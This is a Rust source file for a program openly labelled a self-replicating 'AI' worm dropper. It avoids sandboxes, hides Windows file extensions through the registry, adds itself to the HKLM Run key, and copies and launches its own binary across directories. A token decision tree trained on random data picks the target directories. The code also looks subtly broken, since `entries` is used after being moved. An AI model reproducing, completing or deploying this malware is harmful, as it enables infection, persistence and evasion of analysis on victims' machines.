use clap::Parser;
use rand::Rng;
use std::path::Path;
use walkdir::WalkDir;
use winreg::enums::*;
use winreg::RegKey;
use sysinfo::{System, SystemExt};
use num_cpus;
use linfa::prelude::*;
use linfa_trees::DecisionTree;

#[derive(Parser)]
#[command(name = "AI Self-Replicating Worm (Dropper)")]
#[command(about = "An AI-powered dropper worm that intelligently replicates executables, hides extensions, and adds to autorun")]
struct Args {
    /// Scan and spread the worm
    #[arg(long)]
    scan: bool,

    /// Hide file extensions
    #[arg(long)]
    hide: bool,

    /// Add to autorun
    #[arg(long)]
    autorun: bool,
}

fn get_own_binary() -> Option<Vec<u8>> {
    std::fs::read(std::env::current_exe().ok()?).ok()
}

fn is_in_sandbox() -> bool {
    // Check CPU cores
    if num_cpus::get() < 2 {
        return true;
    }
    // Check total memory (MB)
    let mut sys = System::new_all();
    sys.refresh_all();
    let total_memory = sys.total_memory() / 1024 / 1024;
    if total_memory < 2048 {
        return true;
    }
    // Check uptime (seconds)
    if sys.uptime() < 300 { // Less than 5 minutes
        return true;
    }
    false
}

fn hide_file_extensions() {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    if let Ok(key) = hkcu.open_subkey_with_flags(
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
        KEY_SET_VALUE,
    ) {
        if key.set_value("HideFileExt", &1u32).is_ok() {
            println!("[+] File extensions hidden");
        } else {
            println!("[-] Failed to hide file extensions");
        }
    } else {
        println!("[-] Failed to open registry key for hiding extensions");
    }
}

fn add_to_autorun() {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(key) = hklm.open_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        KEY_SET_VALUE,
    ) {
        if let Ok(exe_path) = std::env::current_exe() {
            if let Some(exe_str) = exe_path.to_str() {
                if key.set_value("SelfReplicatingWorm", &exe_str).is_ok() {
                    println!("[+] Added to autorun");
                } else {
                    println!("[-] Failed to add to autorun");
                }
            } else {
                println!("[-] Failed to convert exe path to string");
            }
        } else {
            println!("[-] Failed to get current exe path");
        }
    } else {
        println!("[-] Failed to open registry key for autorun");
    }
}

fn ai_decide_to_drop(file_count: f32, depth: f32) -> bool {
    // Generate realistic training data based on typical directory structures
    let mut features = Vec::new();
    let mut labels = Vec::new();

    // Simulate data from real directories: small dirs (few files, shallow) -> false, large/deep -> true
    for i in 0..100 {
        let fc = (i % 20) as f32 + rand::random::<f32>() * 10.0; // 0-30 files
        let d = (i % 5) as f32 + rand::random::<f32>() * 3.0; // 0-8 depth
        let should_drop = fc > 10.0 && d > 2.0; // Realistic rule: drop if crowded and deep
        features.push(vec![fc, d]);
        labels.push(if should_drop { 1.0 } else { 0.0 });
    }

    let features_array = Array2::from_shape_vec((features.len(), 2), features.into_iter().flatten().collect()).unwrap();
    let labels_array = Array1::from_vec(labels);

    let dataset = Dataset::new(features_array, labels_array);
    let model = DecisionTree::params().fit(&dataset).unwrap();

    let input = Array2::from_shape_vec((1, 2), vec![file_count, depth]).unwrap();
    let prediction = model.predict(&input);
    let decision = prediction[0] > 0.5;

    println!("[AI] Directory has {} files, depth {}, deciding to {}", file_count, depth, if decision { "drop" } else { "skip" });
    decision
}

fn drop_and_spawn_to_directory(target_dir: &Path, binary: &[u8]) {
    let mut rng = rand::thread_rng();
    let random_name = format!("worm_{}.exe", rng.gen_range(1000..10000));
    let target_path = target_dir.join(random_name);

    if std::fs::write(&target_path, binary).is_ok() {
        println!("[+] Dropped executable to: {:?}", target_path);
        if let Ok(child) = std::process::Command::new(&target_path).spawn() {
            println!("[+] Spawned process: {}", child.id());
        } else {
            println!("[-] Failed to spawn process");
        }
    } else {
        println!("[-] Failed to drop executable to: {:?}", target_path);
    }
}

fn scan_and_spread() {
    if let Some(my_binary) = get_own_binary() {
        let current_dir = std::env::current_dir().unwrap_or_else(|_| Path::new(".").to_path_buf());
        println!("[*] AI Worm (Dropper) started at: {:?}", current_dir);

        let mut entries = vec![];
        for entry in WalkDir::new(&current_dir).into_iter().filter_map(|e| e.ok()) {
            if entry.file_type().is_dir() {
                entries.push(entry);
            }
        }

        for entry in entries {
            let dir_name = entry.file_name().to_str().unwrap_or("");
            let depth = entry.depth();
            if !["__pycache__", "System", "Windows"].contains(&dir_name) && ai_decide_to_drop(entries.len() as f32, depth as f32) {
                drop_and_spawn_to_directory(entry.path(), &my_binary);
            }
        }
    } else {
        println!("[-] Failed to get own binary");
    }
}

fn print_banner() {
    println!("AI Self-Replicating Worm (Dropper) v1.0");
    println!("=====================================");
    println!("Warning: This is malware. Use at your own risk.");
    println!();
}

fn main() {
    print_banner();
    if is_in_sandbox() {
        println!("[-] Detected sandbox environment. Exiting.");
        return;
    }
    let args = Args::parse();
    let run_all = !args.scan && !args.hide && !args.autorun;

    if args.hide || run_all {
        hide_file_extensions();
    }
    if args.autorun || run_all {
        add_to_autorun();
    }
    if args.scan || run_all {
        scan_and_spread();
    }
}